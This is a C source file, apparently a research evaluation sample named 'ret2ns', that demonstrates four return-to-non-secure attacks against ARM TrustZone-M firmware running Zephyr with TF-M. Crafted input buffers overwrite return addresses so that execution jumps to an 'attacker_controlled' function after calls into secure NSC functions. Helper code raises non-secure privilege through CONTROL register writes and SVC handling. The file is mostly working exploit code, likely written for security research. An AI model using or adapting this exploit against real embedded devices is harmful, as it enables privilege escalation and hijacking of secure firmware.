/*
 * SPDX-License-Identifier: Apache-2.0
 *
 * ret2ns evaluation sample for Zephyr NSPE + TF-M SPE.
 */

#include <stdint.h>
#include <errno.h>
#include <string.h>
#include <stdio.h>

#include <cmsis_core.h>
#include <zephyr/kernel.h>
#include <zephyr/sys/util.h>
#include <zephyr/arch/cpu.h>
#include <zephyr/linker/linker-defs.h>
#include <tfm_veneers.h>

#define DROP_NS_PRIVILEGES __asm("mrs %[reg], CONTROL\norr %[reg], #0x1\nmsr CONTROL, %[reg] " ::[reg] "r"(1) \
                                 : "memory")

#define SET_NS_PRIVILEGES __asm("msr CONTROL, %[reg] " ::[reg] "r"(0) \
                                : "memory")

void attack_1(void) __attribute__((noinline));
void attack_2(void) __attribute__((noinline));
void attack_3(void) __attribute__((noinline));
void attack_4(void) __attribute__((noinline));
void print_LCD(char *msg);
void attack_2_svc(char *msg);
void raise_privilege(void);

typedef int32_t (*nsc_print_fn_t)(char *);

static volatile nsc_print_fn_t nsc_print_LCD = print_LCD_nsc;
static volatile nsc_print_fn_t nsc_blxns = blxns_nsc;

static int32_t call_print_LCD_nsc(char *msg)
{
    nsc_print_fn_t fn = nsc_print_LCD;
    return fn(msg);
}

static int32_t call_blxns_nsc(char *msg)
{
    nsc_print_fn_t fn = nsc_blxns;
    return fn(msg);
}

static int32_t LED_On(uint32_t num)
{
    ARG_UNUSED(num);

    return 0;
}

void z_arm_svc_main(uint32_t exc_return_code, uint32_t msp_val)
{
    uint32_t stack_frame_addr;
    unsigned int *svc_args;
    uint8_t svc_number;
    // Determines which stack pointer was used
    if (exc_return_code & 0x4)
        stack_frame_addr = __get_PSP();
    else
        stack_frame_addr = msp_val;
    // Determines whether additional state context is present
    if (exc_return_code & 0x20)
    {
        svc_args = (unsigned *)stack_frame_addr;
    }
    else
    { // additional state context present (only for Secure SVC)
        svc_args = (unsigned *)(stack_frame_addr + 40);
    }
    // extracts SVC number
    svc_number = ((char *)svc_args[6])[-2]; // Memory[(stacked_pc)-2]
    switch (svc_number)
    {
    case 0:
        SET_NS_PRIVILEGES;
        break;
    case 1:
        print_LCD_nsc((char *)svc_args[0]);
        break;
    case 2:
        blxns_nsc((char *)svc_args[0]);
        break;
    default:
        break;
    }
}

int get_driver_status()
{
    return 0;
}

/* Attack 2 */
void attack_2_print_LCD(char *msg)
{
    register char *r0 __asm("r0") = msg;
    __asm volatile("svc #2"
                   :
                   : "r"(r0));
}

/* Attack 3 */
void atk_3_print_LCD(char *msg)
{
    print_LCD_nsc(msg);
    LED_On(1u);
}

/* Attack 4 */
void atk_4_print_LCD(char *msg)
{
    blxns_nsc(msg);
    LED_On(2u);
}

/*----------------------------------------------------------------------------
  Attacker-controlled function: should only execute in unprivileged level
  address: 0x00200620
 *----------------------------------------------------------------------------*/
void attacker_controlled(void)
{
    printf("attacker controlled\n");
	while (1)
    {
    }
}

/*----------------------------------------------------------------------------
  Attack 1: Non-secure handler calls secure NSC function,
   and then BXNS returns back (shared IPSR)
 *----------------------------------------------------------------------------*/
void attack_1(void)
{
    char user_input[28] = {
        0x20, 0x06, 0x20, 0x00};
    print_LCD(user_input);
}

/*----------------------------------------------------------------------------
  Attack 2: Non-secure handler calls secure NSC function,
   and then BLXNS calls another non-secure function (IPSR changes with the non-secure function call)
 *----------------------------------------------------------------------------*/
void attack_2(void)
{
    char user_input[28] = {
        0x20, 0x06, 0x20, 0x00};
    attack_2_print_LCD(user_input);
}

/*----------------------------------------------------------------------------
  Attack 3: Non-secure privileged thread calls secure NSC function,
   and then BXNS returns back (banked CONTROL_NS.nPRIV)
 *----------------------------------------------------------------------------*/
void attack_3(void)
{
    raise_privilege();
    char user_input[28] = {
        0x20, 0x06, 0x20, 0x00};
    atk_3_print_LCD(user_input);
}

/*----------------------------------------------------------------------------
  Attack 4: Non-secure privileged thread calls secure NSC function,
   and then BLXNS calls another non-secure function (IPSR changes with the non-secure function call)
 *----------------------------------------------------------------------------*/
void attack_4(void)
{
    raise_privilege();
    char user_input[28] = {
        0x20, 0x06, 0x20, 0x00};
    atk_4_print_LCD(user_input);
}

int main(void)
{
	/* register NonSecure callbacks in Secure application */
    // if (pass_nsfunc_ptr_o_int_i_void(&get_driver_status))
    //     __BKPT(0);
	// ret2ns_register_callback_nsc(get_driver_status);

	/* disable SysTick */
	arm_irq_disable(SysTick_IRQn);

    // ret2ns_set_ns_vtor();

	// __asm__ volatile(
	// 	"movw r0, 0xed94\n"
	// 	"movt r0, 0xe000\n"
	// 	"ldr r1, [r0]\n"
	// 	"sub r1, #1\n"
	// 	"str r1, [r0]\n"
	// 	:::"r0", "r1"
	// );

    /* drop NS privilege level */
    // DROP_NS_PRIVILEGES;

#ifdef ATTACK1
    // attack_1();
	// char user_input[32] = {
    //     0x20, 0x06, 0x20, 0x00};
	uint32_t target = ((uint32_t)attacker_controlled) | 1U;
    char user_input[28] = {0};

    memcpy(&user_input[24], &target, sizeof(target));
    // print_LCD(user_input);
	// register char *r0 __asm("r0") = user_input;

	call_print_LCD_nsc(user_input);

#elif defined ATTACK2
    // attack_2();

	uint32_t target = ((uint32_t)attacker_controlled + 4) | 1U;
	char user_input[28] = {0};

	memcpy(&user_input[12], &target, sizeof(target));

	// blxns_nsc((char *)svc_args[0]);
	call_blxns_nsc(user_input);
#elif defined ATTACK3
    attack_3();
#elif defined ATTACK4
    attack_4();
#endif

    /* Legit: call attacker controlled function in unprivileged mode */
    attacker_controlled();

    while (1)
    {
    }

	return 0;
}
